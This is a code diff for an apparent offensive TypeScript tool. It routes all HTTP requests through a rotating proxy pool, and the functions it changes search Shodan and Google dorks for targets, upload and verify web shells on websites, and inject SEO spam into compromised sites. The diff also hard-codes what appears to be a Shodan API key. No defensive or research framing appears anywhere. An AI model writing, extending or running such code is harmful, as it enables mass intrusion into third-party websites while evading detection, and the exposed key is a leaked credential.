@@ -132,8 +132,17 @@ export interface ExecutionReport {
 //  CONSTANTS
 // ═══════════════════════════════════════════════════════
 
+import { fetchWithPoolProxy } from "./proxy-pool";
 import { ENV } from "./_core/env";
 import { proxyPool } from "./proxy-pool";
+
+// Helper: wrap fetch with proxy pool
+async function execFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}): Promise<Response> {
+  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
+  const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: 15000 });
+  return response;
+}
+
 const SHODAN_API_KEY = ENV.shodanApiKey || "KB7CKlhzcvczNryIcT7SsCCwGxi8LATZ";
 
 const SHODAN_QUERIES = [
@@ -218,7 +227,7 @@ export async function shodanSearch(targetDomain?: string): Promise<ShodanSearchR
       const controller = new AbortController();
       const timeout = setTimeout(() => controller.abort(), 12000);
 
-      const response = await fetch(url, {
+      const response = await execFetch(url, {
         signal: controller.signal,
         headers: { "Accept": "application/json" },
       });
@@ -267,7 +276,7 @@ export async function googleDorkSearch(targetDomain?: string): Promise<string[]>
       const controller = new AbortController();
       const timeout = setTimeout(() => controller.abort(), 10000);
 
-      const response = await fetch(url, {
+      const response = await execFetch(url, {
         signal: controller.signal,
         headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
       });
@@ -306,7 +315,7 @@ export async function testProxy(proxyUrl: string): Promise<ProxyTestResult> {
     const controller = new AbortController();
     const timeout = setTimeout(() => controller.abort(), 5000);
 
-    const response = await fetch(`http://${proxyHost.hostname}:${proxyHost.port}`, {
+    const response = await execFetch(`http://${proxyHost.hostname}:${proxyHost.port}`, {
       signal: controller.signal,
       method: "HEAD",
     }).catch(() => null);
@@ -480,7 +489,7 @@ export async function tryUploadShell(
       const controller = new AbortController();
       const timeout = setTimeout(() => controller.abort(), 15000);
 
-      const response = await fetch(uploadUrl, {
+      const response = await execFetch(uploadUrl, {
         method: "POST",
         headers: {
           ...headers,
@@ -501,7 +510,7 @@ export async function tryUploadShell(
         try {
           const checkController = new AbortController();
           const checkTimeout = setTimeout(() => checkController.abort(), 8000);
-          const check = await fetch(checkUrl, {
+          const check = await execFetch(checkUrl, {
             signal: checkController.signal,
             headers: { "User-Agent": randomChoice(USER_AGENTS) },
           });
@@ -553,7 +562,7 @@ export async function verifyShell(shellUrl: string, password: string): Promise<S
       const controller = new AbortController();
       const timeout = setTimeout(() => controller.abort(), 10000);
 
-      const response = await fetch(testUrl, {
+      const response = await execFetch(testUrl, {
         method: "POST",
         headers: {
           "Content-Type": "application/x-www-form-urlencoded",
@@ -644,7 +653,7 @@ export async function injectSeoSpam(
       const controller = new AbortController();
       const timeout = setTimeout(() => controller.abort(), 12000);
 
-      const response = await fetch(testUrl, {
+      const response = await execFetch(testUrl, {
         method: "POST",
         headers: {
           "Content-Type": "application/x-www-form-urlencoded",
